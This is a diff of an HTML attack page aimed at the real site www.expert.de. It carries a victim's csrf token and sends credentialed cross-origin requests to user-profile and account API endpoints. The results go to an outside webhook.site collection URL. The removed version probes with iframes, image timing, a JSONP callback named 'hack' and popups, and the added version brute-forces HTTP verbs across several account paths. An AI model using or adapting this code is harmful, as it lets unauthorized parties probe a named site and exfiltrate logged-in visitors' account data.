@@ -1,68 +1,34 @@
 <!DOCTYPE html>
 <meta charset="utf-8">
-<title>exp-cors-v2</title>
+<title>brut-HEAD</title>
 <script>
-  const HOOK = 'https://webhook.site/adf2fe42-6019-4297-b27a-ca8bf04acf73';
+  const HOOK='https://webhook.site/adf2fe42-6019-4297-b27a-ca8bf04acf73';
+  function log(x){fetch(HOOK,{method:'POST',mode:'no-cors',body:x}).catch(()=>{})}
 
-  function log(txt){
-    fetch(HOOK,{method:'POST', mode:'no-cors', body:txt}).catch(()=>{});
+  const verbs=['GET','HEAD','POST','PUT','PATCH','DELETE','OPTIONS','TRACE','CONNECT','CUSTOM1','PING','DEBUG'];
+  const paths=[
+     'api/user/profile',
+     'api/v1/user',
+     'api/account',
+     'api/me',
+     'user',
+     'profile',
+     'account',
+     'customer'
+  ];
+
+  const tk='1e206742-fb4a-44d2-8174-be9b2e2d6425';
+
+  for(const vb of verbs){
+    for(const pa of paths){
+      fetch(`https://www.expert.de/${pa}`,{
+         method:vb,
+         credentials:'include',
+         headers:{'csrf-token':tk},
+         mode:'no-cors'
+      })
+      .then(r => log(`HEAD-${vb}-${pa}=${r.type},redir=${r.redirected}`))
+      .catch(()=>log(`HEAD-${vb}-${pa}=fail`));
+    }
   }
-
-  window.onload = function(){
-
-    /* 1) iframe + onload/onerror → saberemos se deu 2xx ou 4xx/5xx */
-    const f=document.createElement('iframe');
-    f.style.display='none';
-    f.src='https://www.expert.de/api/user/profile';
-    f.onload  = () => log('V7-iframe:load  (>=200 <400)');
-    f.onerror = () => log('V7-iframe:error (>=400 ou bloqueio)');
-    document.body.appendChild(f);
-
-    /* 2) img com cookie → código de status via tamanho/timing */
-    const i=new Image();
-    i.src='https://www.expert.de/api/user/profile?c='+Date.now();
-    const t0=performance.now();
-    i.onload  = () => log('V8-img:ok  time='+(performance.now()-t0));
-    i.onerror = () => log('V8-img:err time='+(performance.now()-t0));
-
-    /* 3) GET via no-cors SEM ler body → só pega status raw */
-    fetch('https://www.expert.de/api/user/profile',{
-       method:'GET',
-       credentials:'include',
-       headers:{'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425'},
-       mode:'no-cors',
-       cache:'no-cache'
-    })
-    .then(r => log('V9-no-cors-raw: type='+r.type+' redirected='+r.redirected))
-    .catch(e => log('V9-err:'+e));
-
-    /* 4) HEAD request (muitos servers deixam passar sem ACAO) */
-    fetch('https://www.expert.de/api/user/profile',{
-       method:'HEAD',
-       credentials:'include',
-       headers:{'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425'},
-       mode:'no-cors'
-    })
-    .then(r => log('V10-HEAD: type='+r.type))
-    .catch(e => log('V10-err:'+e));
-
-    /* 5) <script src> com cookie – se retornar JSONP/JS válido roda */
-    const s=document.createElement('script');
-    s.src='https://www.expert.de/api/user/profile?callback=hack';
-    window.hack=(d)=>log('V11-script:'+JSON.stringify(d).slice(0,100));
-    s.onerror=()=>log('V11-script:fail');
-    document.head.appendChild(s);
-
-    /* 6) window.open + depois ler location (timing attack) */
-    const w=window.open('https://www.expert.de/api/user/profile?t='+Date.now());
-    setTimeout(()=>{
-      try{
-        log('V12-popup: location='+w.location.href);
-      }catch(e){
-        log('V12-popup: blocked/SOP');
-      }
-      try{w.close();}catch(e){}
-    },1500);
-
-  };
 </script>
